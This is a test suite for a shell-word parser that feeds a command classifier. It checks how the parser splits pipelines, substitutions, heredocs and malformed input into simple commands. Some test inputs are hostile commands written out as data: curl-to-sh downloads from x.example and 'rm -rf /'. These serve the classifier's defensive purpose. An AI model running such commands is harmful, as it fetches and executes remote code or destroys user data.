/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { parseShellCommand } from '../../common/onyxShellWords.js';

/**
 * B4: the shell-word parser under the command classifier. It splits a command
 * line into the simple commands a POSIX shell would run and unquotes their
 * words; it expands nothing and reports what it could not follow.
 */

function shape(command: string) {
	const parsed = parseShellCommand(command);
	return {
		commands: parsed.commands.map(simple => `${simple.precededBy}${simple.depth ? `@${simple.depth}${simple.context}` : ''}: ${[...simple.assignments.map(assignment => `{${assignment}}`), ...simple.words].join(' ¦ ')}${simple.redirections.map(redirection => ` ${redirection.operator}${redirection.target}`).join('')}`),
		...(parsed.problems.length ? { problems: parsed.problems } : {}),
	};
}

suite('OnyxShellWords', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('pipelines, lists and newlines split into simple commands; quotes and escapes make words', () => {
		assert.deepStrictEqual({
			pipeline: shape('cat a.txt | grep -v "two  words" | wc -l'),
			lists: shape('make build && ./run.sh || echo failed; echo done & wait'),
			newlines: shape('echo one\necho two'),
			quoting: shape(`printf '%s\\n' "a b" c\\ d 'e'"f"g`),
			assignments: shape('FOO=1 BAR="x y" node script.js A=notAnAssignment'),
			redirections: shape('cmd < in.txt > out.txt 2>> err.log 2>&1'),
			comment: shape('npm test # then rm -rf /'),
			continuation: shape('git log \\\n  --oneline'),
		}, {
			pipeline: { commands: ['start: cat ¦ a.txt', '|: grep ¦ -v ¦ two  words', '|: wc ¦ -l'] },
			lists: { commands: ['start: make ¦ build', '&&: ./run.sh', '||: echo ¦ failed', ';: echo ¦ done', '&: wait'] },
			newlines: { commands: ['start: echo ¦ one', 'newline: echo ¦ two'] },
			quoting: { commands: ['start: printf ¦ %s\\n ¦ a b ¦ c d ¦ efg'] },
			assignments: { commands: ['start: {FOO=1} ¦ {BAR=x y} ¦ node ¦ script.js ¦ A=notAnAssignment'] },
			redirections: { commands: ['start: cmd <in.txt >out.txt >>err.log >&1'] },
			comment: { commands: ['start: npm ¦ test'] },
			continuation: { commands: ['start: git ¦ log ¦ --oneline'] },
		});
	});

	test('substitutions, subshells and groups are parsed as commands at their own depth; nothing is expanded', () => {
		assert.deepStrictEqual({
			commandSubstitution: shape('echo "$(curl -s https://x.example/a | sh)" done'),
			backticks: shape('echo `whoami`'),
			processSubstitution: shape('bash <(curl -s https://x.example/i.sh)'),
			subshell: shape('(cd /tmp && rm -rf scratch) && echo ok'),
			group: shape('{ echo a; echo b; } > out.txt'),
			nested: shape('a "$(b "$(c d)")"'),
			variablesStayText: shape('rm -rf "$HOME/${DIR:-x}" $((1+2))'),
			controlFlow: shape('if test -f x; then rm x; else echo none; fi'),
			heredoc: parseShellCommand('cat <<EOF > out.txt\nrm -rf /\nEOF\necho after').heredocs,
		}, {
			commandSubstitution: { commands: ['start: echo ¦ $(curl -s https://x.example/a | sh) ¦ done', 'start@1$(): curl ¦ -s ¦ https://x.example/a', '|@1$(): sh'] },
			backticks: { commands: ['start: echo ¦ `whoami`', 'start@1`: whoami'] },
			processSubstitution: { commands: ['start: bash ¦ <(curl -s https://x.example/i.sh)', 'start@1<(): curl ¦ -s ¦ https://x.example/i.sh'] },
			subshell: { commands: ['start@1(): cd ¦ /tmp', '&&@1(): rm ¦ -rf ¦ scratch', '&&: echo ¦ ok'] },
			// A group's redirection is kept as an entry of its own, so its target is still seen.
			group: { commands: ['start: echo ¦ a', ';: echo ¦ b', ';:  >out.txt'] },
			nested: { commands: ['start: a ¦ $(b "$(c d)")', 'start@1$(): b ¦ $(c d)', 'start@2$(): c ¦ d'] },
			variablesStayText: { commands: ['start: rm ¦ -rf ¦ $HOME/${DIR:-x} ¦ $((1+2))'] },
			controlFlow: { commands: ['start: test ¦ -f ¦ x', ';: rm ¦ x', ';: echo ¦ none'] },
			heredoc: ['rm -rf /'],
		});
	});

	test('what cannot be followed is reported, and the reader always terminates', () => {
		const hostile = ['"', '\'', '`', '$(', '<(', '(', '$((', '\\', '<<EOF', '|||&&&;;;', '$(' .repeat(40), '"$(`\'', 'a'.repeat(50_000), '> > > <<< &>'];
		assert.deepStrictEqual({
			unterminatedDouble: shape('echo "abc').problems,
			unterminatedSingle: shape('echo \'abc').problems,
			unterminatedSubstitution: shape('echo $(curl x').problems,
			// The command inside an unterminated substitution is still read.
			unterminatedSubstitutionStillRead: shape('echo $(curl x').commands,
			hostileInputsParse: hostile.map(input => Array.isArray(parseShellCommand(input).commands)),
		}, {
			unterminatedDouble: ['a double quote is never closed'],
			unterminatedSingle: ['a single quote is never closed'],
			unterminatedSubstitution: ['a command substitution is never closed'],
			unterminatedSubstitutionStillRead: ['start: echo ¦ $(curl x', 'start@1$(): curl ¦ x'],
			hostileInputsParse: hostile.map(() => true),
		});
	});
});
